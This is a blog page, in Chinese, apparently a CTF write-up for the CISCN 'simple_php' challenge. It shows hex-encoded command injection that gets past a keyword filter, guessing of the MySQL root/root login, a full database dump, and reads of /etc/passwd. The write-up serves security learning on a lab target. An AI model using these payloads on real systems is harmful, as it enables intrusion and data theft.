@@ -1,0 +1,290 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>ciscn-wp | Dyinglight&#39;s blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="ciscn writeupwebsimple_php（复现）解法一比赛的时候一直在尝试其他命令，看了wp才发现能用php -r ‘代码’来执行php语句或者系统命令 与此相似的还有php -i可以查看phpinfo等等 但是由于题目过滤了许多关键字，我们可以利用hex2bin转码绕过过滤 hex2bin(‘语句’);	但是由于过滤了引号，使用substr截取一个字符(这里是下划线)，剩下的就会被识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ciscn-wp">
+<meta property="og:url" content="http://dyinglight5.github.io/posts/ciscn-wp/index.html">
+<meta property="og:site_name" content="Dyinglight&#39;s blog">
+<meta property="og:description" content="ciscn writeupwebsimple_php（复现）解法一比赛的时候一直在尝试其他命令，看了wp才发现能用php -r ‘代码’来执行php语句或者系统命令 与此相似的还有php -i可以查看phpinfo等等 但是由于题目过滤了许多关键字，我们可以利用hex2bin转码绕过过滤 hex2bin(‘语句’);	但是由于过滤了引号，使用substr截取一个字符(这里是下划线)，剩下的就会被识">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://dyinglight5.github.io/images/ciscn/1.png">
+<meta property="og:image" content="http://dyinglight5.github.io/images/ciscn/2.png">
+<meta property="og:image" content="http://dyinglight5.github.io/images/ciscn/3.png">
+<meta property="og:image" content="http://dyinglight5.github.io/images/ciscn/4.png">
+<meta property="og:image" content="http://dyinglight5.github.io/images/ciscn/5.png">
+<meta property="og:image" content="http://dyinglight5.github.io/images/ciscn/6.png">
+<meta property="article:published_time" content="2024-05-18T01:38:58.000Z">
+<meta property="article:modified_time" content="2024-07-07T05:47:13.880Z">
+<meta property="article:author" content="Dyinglight">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://dyinglight5.github.io/images/ciscn/1.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Dyinglight's blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Dyinglight&#39;s blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://dyinglight5.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-ciscn-wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/posts/ciscn-wp/" class="article-date">
+  <time class="dt-published" datetime="2024-05-18T01:38:58.000Z" itemprop="datePublished">2024-05-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      ciscn-wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="ciscn-writeup"><a href="#ciscn-writeup" class="headerlink" title="ciscn writeup"></a>ciscn writeup</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="simple-php（复现）"><a href="#simple-php（复现）" class="headerlink" title="simple_php（复现）"></a>simple_php（复现）</h3><h4 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h4><p>比赛的时候一直在尝试其他命令，看了wp才发现能用php -r ‘代码’来执行php语句或者系统命令</p>
+<p>与此相似的还有<code>php -i</code>可以查看phpinfo等等</p>
+<p>但是由于题目过滤了许多关键字，我们可以利用hex2bin转码绕过过滤</p>
+<p>hex2bin(‘语句’);	但是由于过滤了引号，使用substr截取一个字符(这里是下划线)，剩下的就会被识别为字符串</p>
+<p>hex编码	ls &#x2F;    -&gt; 6c73202f</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="title function_ invoke__">system</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">substr</span>(_6c73202f,<span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/1.png"></p>
+<p>命令成功执行</p>
+<p>之后找了一圈没发现flag，ps -def指令可以查看进程</p>
+<p>ps -def -&gt; _7073202d646566</p>
+<p><img src="/../images/ciscn/2.png"></p>
+<p>其中看到了mysql,flag应该在数据库中</p>
+<p>直接猜账户root密码为root, -e执行sql语句</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p<span class="string">&#x27;root&#x27;</span> -e <span class="string">&#x27;show databases;&#x27;</span></span><br><span class="line">cmd=php -r system(hex2bin(substr(_6d7973716c202d7520726f6f74202d7027726f6f7427202d65202773686f77206461746162617365733b27,1)));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/3.png"></p>
+<p>有PHP_CMS information_schema mysql performance_schema test这几个库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;show databases;use PHP_CMS;show tables;&#x27;`</span><br><span class="line">#注意sql语句用反引号执行</span><br><span class="line">#结果Tables_in_PHP_CMS F1ag_Se3Re7</span><br><span class="line">echo `mysql -u root -p&#x27;root&#x27; -e &#x27;use PHP_CMS;select * from F1ag_Se3Re7&#x27;`</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/4.png"></p>
+<p>拿到flag!</p>
+<h4 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h4><p>没有ban掉diff和dd，可以使用diff读目录，dd读文件:</p>
+<p>读根目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diff --recursive / /home</span><br></pre></td></tr></table></figure>
+
+<p>发现根目录没有flag。</p>
+<p>读特定文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=/etc/passwd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/5.png"></p>
+<p>没有flag,但是发现了mysql，猜测账号密码root</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -proot --all-databases</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/ciscn/6.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://dyinglight5.github.io/posts/ciscn-wp/" data-id="clyyhqmow000k0ov58ldvdwg3" data-title="ciscn-wp" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/posts/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">前一篇</strong>
+      <div class="article-nav-title">
+        
+          sql注入总结
+        
+      </div>
+    </a>
+  
+  
+    <a href="/posts/ISCC-wp-dyinglight/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">后一篇</strong>
+      <div class="article-nav-title">ISCC-wp-dyinglight</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">分类</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/ctf-writeup/">ctf writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">ctf刷题日记</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">学习笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf wp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">ctf刷题日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" rel="tag">刷题日记</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ctf-wp/" style="font-size: 10px;">ctf wp</a> <a href="/tags/ctf%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="font-size: 15px;">ctf刷题日记</a> <a href="/tags/%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/" style="font-size: 10px;">刷题日记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 20px;">学习笔记</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/07/">七月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/06/">六月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/05/">五月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/04/">四月 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/03/">三月 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/posts/hello-world/">Hello World</a>
+          </li>
+        
+          <li>
+            <a href="/posts/ssrf%E6%BC%8F%E6%B4%9E/">ssrf漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/posts/7-15%E5%88%B7%E9%A2%98/">7.15刷题</a>
+          </li>
+        
+          <li>
+            <a href="/posts/7-13%E5%88%B7%E9%A2%98/">7.13刷题</a>
+          </li>
+        
+          <li>
+            <a href="/posts/XSS%E6%BC%8F%E6%B4%9E/">XSS漏洞</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 Dyinglight<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
